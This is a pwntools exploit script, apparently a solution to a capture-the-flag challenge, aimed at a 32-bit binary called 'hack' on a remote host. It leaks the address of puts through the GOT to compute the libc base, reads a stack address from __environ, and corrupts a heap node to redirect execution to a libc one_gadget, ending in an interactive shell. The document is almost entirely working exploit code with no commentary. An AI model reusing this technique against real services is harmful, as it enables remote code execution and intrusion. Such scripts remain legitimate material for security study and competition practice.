from pwn import *
# context.log_level = "debug"
lo = lambda x , y : log.success(x + " : " + hex(y))
# p = process("./hack")
p = remote("210.32.4.16" , 13375)
elf = ELF("./hack")
libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
# leak lib to get libc.__environ

def get():
	p.recvuntil(", ")
	return int(p.recvuntil("\n")[:-1] , 16)

# gdb.attach(p , "b *0x080486FF")
puts_got = elf.got["puts"] 
p.sendlineafter("address: \n" , str(puts_got))
puts_addr = get()
libc_base = puts_addr - libc.sym["puts"]
environ_addr = libc_base + libc.sym["__environ"]
p.sendlineafter("chance: \n" , str(environ_addr))
content = get()
lo("puts" , puts_addr)
lo("libc_base" , libc_base)
lo("__environ" , environ_addr)
lo("content" , content)
# raw_input("")
one_gadgets = [0x3a80c , 0x3a80e , 0x3a812 ,  0x3a819 , 0x5f065 , 0x5f066]
# one_gadgets = [0x3ac5c , 0x3ac5e , 0x3ac62 , 0x3ac69 , 0x5fbc5 , 0x5fbc6]
ebp_4 = content - 0xb8
p.recvuntil("the node is ")
node_addr = int(p.recvuntil(",")[:-1] , 16)
lo("node" , node_addr)
one_gadgets_addr = libc_base + one_gadgets[3]
p.recvuntil("now: ")

# shellcode = "\xff\x25" + p32(one_gadgets_addr)
# shellcode = shellcode.ljust(8 , "\x00")
v8 = ebp_4 - 8
v9 = node_addr + 4
payload = p32(one_gadgets_addr) + p32(one_gadgets_addr) + p32(v9) + p32(v8)

p.send(payload)

p.interactive()